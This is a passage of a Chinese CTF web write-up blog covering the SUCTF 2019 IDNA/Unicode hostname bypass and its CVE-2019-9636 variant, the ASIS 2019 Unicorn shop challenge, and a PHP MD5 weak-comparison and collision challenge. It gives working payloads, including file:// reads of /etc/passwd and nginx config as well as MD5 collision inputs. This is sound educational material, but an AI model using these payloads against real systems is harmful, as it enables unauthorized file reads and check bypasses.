punctuation">]</span>    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    newhost<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> h <span class="token keyword">in</span> host<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        newhost<span class="token punctuation">.</span>append<span class="token punctuation">(</span>h<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'idna'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'.'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>newhost<span class="token punctuation">)</span>    finalUrl<span class="token operator">=</span>urlunsplit<span class="token punctuation">(</span>parts<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    host<span class="token operator">=</span>parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    get_unicode<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>得出如下结果：</p><pre><code>str: ℂ unicode: \u2102str: Ⅽ unicode: \u216dstr: ⅽ unicode: \u217dstr: Ⓒ unicode: \u24b8str: ⓒ unicode: \u24d2str: Ｃ unicode: \uff23str: ｃ unicode: \uff43</code></pre><p>传入读取文件即可</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200428122756772.png" alt="image-20200428122756772" loading="lazy"></p><p>另外还有一种用<code>℆</code>字符进行的读法：</p><p><code>file://suctf.c℆sr/local/nginx/conf/nginx.conf</code>==经过编码==&gt;<code>file://suctf.cc/usr/local/nginx/conf/nginx.conf</code>，将c和u都给补全了，这样也可以读取到文件内容</p><p>另外这里还有个非预期解利用的是<code>CVE-2019-9636</code>，利用的是<code>urlsplit不处理NFKC标准化</code>，payload：<code>file:////suctf.cc/../../../../../etc/passwd</code>，资料较少，利用的似乎是那四个斜杠</p><p><code>list(urllib.parse.urlsplit(&quot;file:////suctf.cc/../../../../../etc/passwd&quot;))</code>=<code>[&#39;file&#39;, &#39;&#39;, &#39;//suctf.cc/../../../../../etc/passwd&#39;, &#39;&#39;, &#39;&#39;]</code>，这样一来第二个值就不是原来的<code>hostname</code>而是空，即可绕过前两个if判断，漏洞利用条件：</p><pre><code>Python Python &gt;=2.7.x，&lt;=2.7.16Python Python &gt;=3.x，&lt;=3.7.2</code></pre><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200502184210541.png" alt="" loading="lazy"></p><p>可以看到应该是叫我们买独角兽，而且肯定是要买最贵的那个</p><p>首先输入<code>4</code>和<code>1337.0</code>提示<code>Only one char(?) allowed!</code>只能输入一个字符，在试一下发现报错页面代码：</p><pre class=" language-python"><code class="language-python">Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>  File <span class="token string">"/usr/local/lib/python2.7/site-packages/tornado/web.py"</span><span class="token punctuation">,</span> line <span class="token number">1541</span><span class="token punctuation">,</span> <span class="token keyword">in</span> _execute    result <span class="token operator">=</span> method<span class="token punctuation">(</span><span class="token operator">*</span>self<span class="token punctuation">.</span>path_args<span class="token punctuation">,</span> <span class="token operator">**</span>self<span class="token punctuation">.</span>path_kwargs<span class="token punctuation">)</span>  File <span class="token string">"/app/sshop/views/Shop.py"</span><span class="token punctuation">,</span> line <span class="token number">34</span><span class="token punctuation">,</span> <span class="token keyword">in</span> post    unicodedata<span class="token punctuation">.</span>numeric<span class="token punctuation">(</span>price<span class="token punctuation">)</span>TypeError<span class="token punctuation">:</span> need a single Unicode character <span class="token keyword">as</span> parameter</code></pre><p>需要一个Unicode字符作为参数，再回到前面看看源码，有提示：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--Ah,really important,seriously. --></span></code></pre><p>于是我们寻找到比1337大的<code>Unicode</code>字符<code>U+4E07</code>，<code>utf-8</code>编码后的16进制为<code>E4 B8 87</code>，在前面加入<code>%</code>得到<code>%E4%B8%87</code>传入即可</p><h1 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h1><h2 id="安恒月赛—web2-hash"><a href="#安恒月赛—web2-hash" class="headerlink" title="安恒月赛—web2_hash"></a>安恒月赛—web2_hash</h2><p>本题参考：</p><blockquote><p><a href="https://www.gem-love.com/ctf/1799.html#web2_hash" target="_blank" rel="noopener">2020二月安恒月赛抗疫练习赛web题目writeup</a><br><a href="https://xz.aliyun.com/t/4741#toc-7" target="_blank" rel="noopener">2019掘安杯web7 writeup</a><br><a href="https://xz.aliyun.com/t/2232" target="_blank" rel="noopener">第二届强网杯 MD5碰撞 writeup</a></p></blockquote><p>进来先看界面代码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$val1</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'val1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$val2</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'val2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$val3</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'val3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$val4</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'val4'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$val5</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'val5'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$val6</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'val6'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$val7</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'val7'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$val1</span> <span class="token operator">==</span> <span class="token variable">$val2</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'val1 OR val2 no no no'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$val1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$val2</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'step 1 fail'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$val3</span> <span class="token operator">==</span> <span class="token variable">$val4</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'val3 OR val4 no no no'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$val3</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$val4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'step 2 fail'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$val5</span> <span class="token operator">==</span> <span class="token variable">$val6</span> <span class="token operator">||</span> <span class="token variable">$val5</span> <span class="token operator">==</span> <span class="token variable">$val7</span> <span class="token operator">||</span> <span class="token variable">$val6</span> <span class="token operator">==</span> <span class="token variable">$val7</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'val5 OR val6 OR val7 no no no'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$val5</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$val6</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$val6</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$val7</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$val5</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$val7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'step 3 fail'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"come on!"</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$m</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$n</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ctype_alnum</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span><span class="token punctuation">)</span>  <span class="token operator">||</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ctype_alnum</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"a OR b fail!"</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$n</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"m OR n fail"</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$val8</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$val9</span> <span class="token operator">=</span> <span class="token function">strtr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">,</span> <span class="token variable">$n</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;p>val8 : $val8&lt;/p>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;p>val9 : $val9&lt;/p>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token constant">PHP_EOL</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$val8</span> <span class="token operator">==</span> <span class="token variable">$val9</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">===</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"nice,good job,give you flag:"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'/var/www/html/flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>代码审计一个一个绕</p><p>第1、2个if：<code>val1</code>不能和<code>val2</code>一样，且<code>val1</code>和<code>val2</code>的MD5值需要相同，由于这里是用<code>!=</code>进行判断的，于是就可以用MD5弱比较进行绕过；这里给出两个可以绕过比较的字符串<code>s878926199a</code>和<code>s155964671a</code>、payload：<code>?val1=s878926199a&amp;val2=s155964671a</code>、随后进入下个if（当然这里也可以用数组绕过，下两个if解释）</p><blockquote><p>注：<code>s878926199a</code>的MD5值为<code>0e545993274517709034328855841020</code>，<code>s155964671a</code>的MD5值为<code>0e342768416822451524974117254469</code>函数在执行<code>!=</code>判断的时候会认为是以<code>0e</code>开头的科学计数法，所以两边都为0，即构成了弱比较绕过</p></blockquote><p>第3、4个if：<code>val3</code>不能和<code>val4</code>一样，且<code>val3</code>和<code>val4</code>的MD5值需要相同，而这里使用的是<code>!==</code>进行判断，这种判断会对MD5加密后的字符串进行严格的逐个字符判断，所以使用上面的方法是无效的，但是这里可以使用数组类型进行绕过，由于MD5函数无法处理数组，所以两边返回的都是<code>NULL</code>（上两个if也适用），就构成了绕过；payload：<code>?val1=s878926199a&amp;val2=s155964671a&amp;val3[]=1&amp;val4[]=2</code></p><p>第5、6个if：这里的函数需要让<code>val5</code>、<code>val6</code>、<code>val7</code>都不相等，且三个值的MD5值需要相同，并且使用的是<code>!==</code>进行判断，且在获取数值的时候进行了<code>string</code>类型转换，如果是数组的话会直接转换不成功，三个值没得到东西，第一个判断都过不了，这里就需要找到三个真正相等的MD5值的原型，这里就需要参考一篇文章：<a href="https://xz.aliyun.com/t/3161#toc-5" target="_blank" rel="noopener">基于全等的MD5碰撞绕过</a>、如文章所述（cmd中执行）：</p><pre class=" language-shell"><code class="language-shell">fastcoll_v1.0.0.5.exe -o 0 1    -o参数代表随机生成两个相同MD5的文件fastcoll_v1.0.0.5.exe -p 1 -o 00 01    -p参数代表根据1文件随机生成两个相同MD5的文件，注意：生成的MD5与1不同tail.exe -c 128 00 > a    -c 128代表将00的最后128位写入文件a，这128位正是1与00的MD5不同的原因tail.exe -c 128 01 > b    同理type 0 a > 10    这里表示将0和a文件的内容合并写入10type 0 b > 11    这里表示将0和b文件的内容合并写入11</code></pre><p><a href="http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip" target="_blank" rel="noopener">fastcoll下载链接</a>、<a href="https://www.trisunsoft.com/tail-for-windows.htm" target="_blank" rel="noopener">tail.exe下载链接</a></p><p>这样就生成了4个MD5值相同的文件，查看四个文件的MD5值，是预期结果</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200227120733977.png" alt="" loading="lazy"></p><p>于是在PHP中生成其中三个的urlencode的值：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">function</span>  <span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$fh</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">,</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fh</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">'二进制hash '</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string">"00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;br>\r\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token string">'URLENCODE '</span><span class="token punctuation">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string">"00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;br>\r\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'URLENCODE hash '</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">urlencode</span> <span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string">"00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;br>\r\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'二进制hash '</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string">"10"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;br>\r\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token string">'URLENCODE '</span><span class="token punctuation">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string">"10"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;br>\r\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'URLENCODE hash '</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string">"10"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;br>\r\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'二进制hash '</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string">"11"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;br>\r\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span>  <span class="token string">'URLENCODE '</span><span class="token punctuation">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string">"11"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;br>\r\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'URLENCODE hash '</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">readmyfile</span><span class="token punctuation">(</span><span class="token string">"11"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;br>\r\n"</span><span class="token punctuation">;</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200227121027756.png" alt="" loading="lazy"></p><pre class=" language-HTML"><code class="language-HTML">二进制hash 4e7b1d0c72b69df7992d15f72f7c2056URLENCODE %E5WVVB%15%C6%E6%BD%A8%3C%07E+%3C%92l%95hWq%23%FEn%1CbxRk%AE%07%F1v%03%C1%E7%D0dG7%CB%0F%E1%1B%D4%C9K%F6%F3%81%18%FA%D3%21%7E%CB%7D%FB%B6%C2l%5C%8D2%8F%04%97%83%3ARz%19%D7hf.%04%11%E6%81%5DE%D6%9C2%2C%0Fkv%D9%D3%DBOP%2BA%E1h%B8%8E%04l%82%1E%1D%BDkY%92%93I%01%21%24%B9%D7%EDb%97Hk%21%5DX6%8Aq%11%DC%0DD%F7%11%A0QUC%7C%F2%AD%AEn%FD%01%C9%0F%27%1B%E2%D1%06%88%1B%CEyR%A7%1A7%BCL%BB%AF%DF%D8%AB%1B%2A%E7%FB%D0s%D5%8B%05jh%FE%8A%BCc%9F%16%2A%A6%93%0A%AB%8BR%2A%22%14%06%BF%00%DFS%A2%D8%B5%039%F5%D5CZ%F5%AA%88Q%DE%25%7D+%19%CD%9B%F5%CC%D9%29%5D%B2%BB%7E%97%FA7%E6%7E%E0%A7%AF%CC%AF%7D%C1o%CA%CA%9F%CB%27F%7DL%E9%C0%D3%DA%3Cm%14%3C%81URLENCODE hash c09ff9138646c9e4ad9234d07ed6f935二进制hash 4e7b1d0c72b69df7992d15f72f7c2056URLENCODE %E5WVVB%15%C6%E6%BD%A8%3C%07E+%3C%92l%95h%D7q%23%FEn%1CbxRk%AE%07%F1v%03%C1%E7%D0dG7%CB%0F%E1%1B%D4IK%F6%F3%81%18%FA%D3%21%7E%CB%7D%FB%B6Bl%5C%8D2%8F%04%97%83%3ARz%19%D7hf.%04%11%E6%81%5DE%D6%1C2%2C%0Fkv%D9%D3%DBOP%2BA%E1h%B8%8E%04l%82%1E%1D%BDkY%92%13J%01%21%24%B9%D7%EDb%97Hk%21%5D%D86%8Aq%11%DC%0DD%F7%11%A0QUC%7C%F2%AD%AEn%FD%01%C9%0F%27%1B%E2%D1%06%88%1B%CEyR%A7%1A7%BCL%BB%AF%DF%D8%AB%1B%2A%E7%FB%D0s%D5%8B%05jh%FE%8A%BCc%9F%16%2A%A6%93%0A%AB%8BR%2A%22%14%06%BF%00%DFS%A2%D8%B5%039%F5%D5CZ%F5%AA%88Q%DE%25%7D+%19%CD%9B%F5%CC%D9%29%5D%B2%BB%7E%97%FA7%E6%7E%E0%A7%AF%CC%AF%7D%C1o%CA%CA%9F%CB%27F%7DL%E9%C0%D3%DA%3Cm%14%3C%81URLENCODE hash 6b9eaae07963a665dcc4cabcad530507二进制hash 4e7b1d0c72b69df7992d15f72f7c2056URLENCODE %E5WVVB%15%C6%E6%BD%A8%3C%07E+%3C%92l%95h%D7q%23%FEn%1CbxRk%AE%07%F1v%03%C1%E7%D0dG7%CB%0F%E1%1B%D4IK%F6%F3%81%18%FA%D3%21%7E%CB%7D%FB%B6Bl%5C%8D2%8F%04%97%83%3ARz%19%D7hf.%04%11%E6%81%5DE%D6%1C2%2C%0Fkv%D9%D3%DBOP%2BA%E1h%B8%8E%04l%82%1E%1D%BDkY%92%13J%01%21%24%B9%D7%EDb%97Hk%21%5D%D86%8Aq%11%DC%0DD%F7%11%A0QUC%7C%F2%AD%AEn%FD%01%C9%0F%27%9B%E2%D1%06%88%1B%CEyR%A7%1A7%BCL%BB%AF%DF%D8%AB%1B%2A%E7%FB%D0s%D5%0B%06jh%FE%8A%BCc%9F%16%2A%A6%93%0A%2B%8BR%2A%22%14%06%BF%00%DFS%A2%D8%B5%039%F5%D5CZ%F5%AA%88Q%5E%25%7D+%19%CD%9B%F5%CC%D9%29%5D%B2%BB%7E%97%FA7%E6%7E%E0%A7%AF%CC%AF%7DAo%CA%CA%9F%CB%27F%7DL%E9%C0%D3%DA%BCm%14%3C%81URLENCODE hash 559062db66b89ca9e98b3900fc75066e</code></pre><p>复制到burp中发包，可以看到成功绕过了if，进入下面的if</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200227121221514.png" alt="" loading="lazy"></p><p>第7、8、9个if：POST两个值分别为<code>$a</code>和<code>$b</code>，<code>ctype_alnum()</code>表示函数内的值只能是字母个数字的组合，第7个if的意思我们的<code>$a</code>和<code>$b</code>需要满足<code>ctype_alnum()</code>函数，且长度不能大于五，第8个if的意思是get的参数<code>$m</code>和<code>$n</code>长度不能大于1，也就是只能为一个字符</p><p>后面的<code>$val8</code>为<code>$a</code>MD5加密后的值，<code>$val9</code>为<code>$b</code>结果MD5加密后，替换其中的<code>$m</code>值为<code>$n</code>的值</p><p>最后一个if：表示<code>$val8</code>和<code>$val9</code>的值都必须相等，注意这里是使用<code>==</code>进行判断，也就是说会认为<code>0e</code>开头的为科学计数法进行判断，<code>$a</code>和<code>$b</code>的值不能相等，且<code>$b</code>的长度必须为5</p><p>结果分析，有这种绕过方法：假设<code>$a</code>MD5加密后的值为<code>0e123421342...</code>、<code>$b</code>MD5加密后的值为<code>($m)e4657564745...</code>、就可以利用令<code>$n</code>=0来替换<code>$b</code>MD5加密后的第一位<code>$m</code>的值，从而构成绕过，这是我们只需要得到<strong>一个5位的MD5值开头<code>0e</code>后面跟的全是数字的MD5原型</strong>和<strong>一个5位的MD5值的第二位为e后面跟的全是数字的MD5原型</strong>，于是写脚本跑出这两个5位数：</p><pre class=" language-python"><code 